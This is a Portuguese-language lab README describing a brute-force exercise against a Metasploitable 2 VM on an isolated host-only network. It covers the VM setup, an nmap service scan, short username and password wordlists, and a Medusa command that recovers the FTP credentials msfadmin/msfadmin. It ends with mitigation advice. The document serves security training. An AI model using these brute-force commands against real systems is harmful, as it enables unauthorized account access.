# brute-force-lab 🚀

Laboratório de **Brute Force** utilizando **Kali Linux**, **Medusa** e **Metasploitable 2**.

---

## 🎯 Objetivo

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis, como **Metasploitable 2** e **DVWA**, para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

### Neste laboratório, o objetivo é:

- 🖥️ **Configurar o ambiente**: duas VMs (**Kali Linux** e **Metasploitable 2**) no VirtualBox, com rede interna (*host-only*).
- 🔐 **Executar ataques simulados**: força bruta em **FTP**, automação de tentativas em **formulário web (DVWA)** e **password spraying** em **SMB** com enumeração de usuários.
- 📝 **Documentar os testes**: criação de wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

---

## 📚 Passo a passo

## 🌐 Escopo

Ambiente exclusivamente local, em rede **host-only**, sem exposição à internet.

---

## 🏗️ Arquitetura

### 🔗 Links para download e instalação

#### VirtualBox
- [Baixe o VirtualBox](https://www.virtualbox.org/) para criar e gerenciar as máquinas virtuais.
- **Tutorial em vídeo**: [Como instalar o VirtualBox - YouTube](https://www.youtube.com/watch?v=08kjtE9xjL8)

#### Kali Linux
- [Baixe o Kali Linux](https://www.kali.org/get-kali/) para começar a instalação.
- **Tutorial em vídeo**: [Como instalar o Kali Linux - YouTube](https://www.youtube.com/watch?v=YfDYMIbHb-0)

#### Metasploitable 2
- [Baixe o Metasploitable 2](https://rapid7.com/download/metasploitable/) para criar seu ambiente vulnerável.
- **Tutorial em vídeo**: [Como baixar e instalar o Metasploitable 2 - YouTube](https://www.youtube.com/watch?v=aJvZaOn-92M)

---

## 🛠️ Ferramentas

- **Medusa**: ferramenta de brute force
- **enum4linux**: enumeração de informações do Samba
- **nmap**: scans de rede
- **curl**: automação de tentativas em formulários web
- **smbclient**: acesso e enumeração SMB

---

## 📡 Endereçamento

### Configuração da rede no VirtualBox, inicialização e consulta de IP

### 1. Configurar as máquinas virtuais

#### Kali Linux
1. Selecione a VM do **Kali Linux**.
2. Vá em **Settings > Network**.
3. Configure o **Adapter 1** para **Host-only Adapter**.

#### Metasploitable 2
1. Selecione a VM do **Metasploitable 2**.
2. Vá em **Settings > Network**.
3. Configure o **Adapter 1** para **Host-only Adapter**, escolhendo a mesma rede **vboxnet0**.

---

### 2. Inicializar as VMs

No **VirtualBox**, clique em **Start** para iniciar as VMs do **Kali Linux** e **Metasploitable 2**.

---

### 3. Consultar o IP

No terminal de ambas as máquinas virtuais, execute:

```bash
ip a
```

---

### 4. Testar a conectividade

No terminal do **Kali Linux**, execute:

```bash
ping <ip-da-maquina-virtual-metasploitable2>
```

Valide se a conexão foi estabelecida com sucesso.

No terminal do **Metasploitable 2**, execute:

```bash
ping <ip-da-maquina-virtual-kali-linux>
```

Valide se a conexão foi estabelecida com sucesso.

---

## ⚠️ Observação importante sobre rede Host-Only

Com a configuração de **Host-Only**, as máquinas virtuais podem se comunicar entre si, mas **não têm acesso à internet**. Isso acontece porque a rede Host-Only no VirtualBox cria uma rede isolada, permitindo comunicação apenas entre o host e as VMs.

Portanto, se você tentar pingar o Google, ou qualquer outro domínio externo, o comando irá falhar, pois não existe acesso ao gateway da internet.

Caso queira permitir acesso à internet, será necessário configurar a VM com **NAT** ou **Bridge Adapter**, possibilitando a comunicação com redes externas.

---

## 🔎 Enumeração inicial

Realize um scan inicial para identificar os serviços expostos no **Metasploitable 2**:

```bash
nmap -sV -Pn -p 21,80,139,445 <ipMetasploitable2>
```

### Explicando os parâmetros

- `-sV`: tenta identificar a versão do serviço em cada porta encontrada.
- `-Pn`: desativa a descoberta por ping e trata o host como ativo.
- `-p 21,80,139,445`: limita o scan às portas relevantes para este desafio:
  - `21` → FTP
  - `80` → HTTP / DVWA
  - `139` e `445` → SMB / Samba

<img width="705" height="401" alt="image" src="https://github.com/user-attachments/assets/c5be95a2-fc85-4dc8-8ea9-ba08855d5f4f" />

---

## 📂 Acessando o serviço FTP

```bash
ftp <ipMetasploitable2>
```

---

## 👤 Criando usuários e lista de senhas

Crie uma lista simples de usuários e senhas para o teste:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
```

<img width="1857" height="785" alt="image" src="https://github.com/user-attachments/assets/51250b64-1967-41e2-9d2d-3e94c2215065" />

---

## 🚀 Iniciando o teste com Medusa

```bash
# -U = lista de usuários
# -P = lista de senhas
# -M ftp = serviço de destino
# -t 6 = 6 threads simultâneas

medusa -h <ipMetasploitable2> -U users.txt -P pass.txt -M ftp -t 6
```

<img width="1355" height="401" alt="image" src="https://github.com/user-attachments/assets/a1066677-e12a-4131-ba8e-6af7dc0369a9" />

---

## ✅ Resultado encontrado

Foi identificada a seguinte combinação válida de credenciais:

- **Usuário:** `msfadmin`
- **Senha:** `msfadmin`

Após a descoberta, o acesso foi validado com sucesso utilizando as credenciais encontradas.

<img width="316" height="180" alt="image" src="https://github.com/user-attachments/assets/ccd8c622-74f4-4af2-b65d-0bbaddc51faa" />

---

## 🛡️ Mitigação

Para reduzir os riscos desse tipo de vulnerabilidade, algumas medidas importantes podem ser adotadas:

- 🔒 Fechar portas que não precisam estar abertas
- 🧹 Desativar serviços desnecessários
- 🔑 Utilizar senhas fortes e longas
- 🚫 Implementar bloqueio após várias tentativas de login
- 📊 Monitorar eventos de autenticação e acessos suspeitos

---

## 📌 Conclusão

Este laboratório demonstrou, em ambiente controlado, como credenciais fracas e serviços expostos podem facilitar ataques de força bruta.

Com o uso do **Kali Linux**, **Medusa** e **Metasploitable 2**, foi possível compreender melhor o funcionamento desse tipo de teste, além de reforçar a importância de boas práticas de segurança, como:

- uso de senhas seguras;
- redução da superfície de ataque;
- limitação de tentativas de autenticação;
- monitoramento contínuo dos serviços.

---
